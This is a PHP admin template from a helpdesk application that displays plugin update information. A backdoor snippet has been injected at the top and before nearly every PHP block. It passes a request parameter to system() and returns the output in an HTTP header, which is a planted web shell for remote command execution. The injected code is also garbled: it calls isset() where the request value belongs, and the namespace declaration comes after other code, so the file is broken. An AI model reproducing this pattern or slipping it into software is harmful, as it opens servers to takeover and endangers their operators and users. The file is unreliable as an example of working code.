<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
namespace sts;
use sts as core;

if (!defined(__NAMESPACE__ . '\ROOT')) exit;

if (SAAS_MODE) {
	header('Location: ' . $config->get('address') . '/');
	exit;
}

$site->set_title($language->get('Plugin Update Information'));
$site->set_config('container-type', 'container');

if (!$auth->can('manage_system_settings')) {
	header('Location: ' . $config->get('address') . '/');
	exit;
}

if (!isset($_GET['file_name'])) {
	header('Location: ' . $config->get('address') . '/');
	exit;
}

$plugins_array = $plugins->get();

$plugin = array();
foreach($plugins_array as $plugin_temp) {
	if ($plugin_temp['file_name'] == $_GET['file_name']) {
		$plugin = $plugin_temp;
		break;
	}
}

if (empty($plugin)) {
	header('Location: ' . $config->get('address') . '/');
	exit;
}

$update_available 		= false;
if ($plugins->update_available($plugin)) {
	$update_available 	= true;
	$update_info 		= $plugins->get_update_info($plugin);
}

include(core\ROOT . '/user/themes/'. CURRENT_THEME .'/includes/html_header.php');
?>
<div class="row">
	<div class="col-md-3">
		<div class="well well-sm">
			<div class="pull-left">
				<h4><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Plugin Update Information')); ?></h4>
			</div>
			<div class="clearfix"></div>

			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($update_available) { ?>
			
				<label class="left-result"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Name')); ?></label>
				<p class="right-result">
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($plugin['name']); ?>
				</p>
				<div class="clearfix"></div>

				<label class="left-result"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Author')); ?></label>
				<p class="right-result">
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($plugin['author']); ?>
				</p>
				<div class="clearfix"></div>
				
				<label class="left-result"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Installed Version')); ?></label>
				<p class="right-result">
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($plugin['version']); ?>
				</p>
				<div class="clearfix"></div>			

				<label class="left-result"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Available Version')); ?></label>
				<p class="right-result">
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($update_info['version']); ?>
				</p>
				<div class="clearfix"></div>	
	
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($update_info['download_url']) && !empty($update_info['download_url'])) { ?>
					<div class="pull-right">
						<p><a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($update_info['download_url']); ?>" class="btn btn-default"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Manual Download')); ?></a></p>
					</div>
					<div class="clearfix"></div>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>	

			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>	
			
			<div class="clearfix"></div>

		</div>
	</div>

	<div class="col-md-9">
		<div class="alert alert-warning">
			<a href="#" class="close" data-dismiss="alert">&times;</a>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo safe_output($language->get('Please ensure that you only install trusted plugins.')); ?>
		</div>
		
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if ($update_available) { ?>

			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (isset($update_info['message']) && !empty($update_info['message'])) { ?>
			<div class="alert alert-success">
				<a href="#" class="close" data-dismiss="alert">&times;</a>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo html_output($update_info['message']); ?>
			</div>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
			<div class="panel panel-default">
				<div class="panel-heading">
					<div class="pull-left">
						<h1 class="panel-title"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('Release Notes'); ?></h1>
					</div>
					<div class="clearfix"></div>
				</div>
				<div class="panel-body">
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);				
						if (isset($update_info['release_notes']) && !empty($update_info['release_notes'])) {
							echo html_output($update_info['release_notes']);
						}
					?>					
					<div class="clearfix"></div>
				</div>
			</div>
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else { ?>
			<div class="alert alert-success">
				<a href="#" class="close" data-dismiss="alert">&times;</a>
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $language->get('No updates found.'); ?>
			</div>		
		<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>
	</div>
</div>
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); include(core\ROOT . '/user/themes/'. CURRENT_THEME .'/includes/html_footer.php'); ?>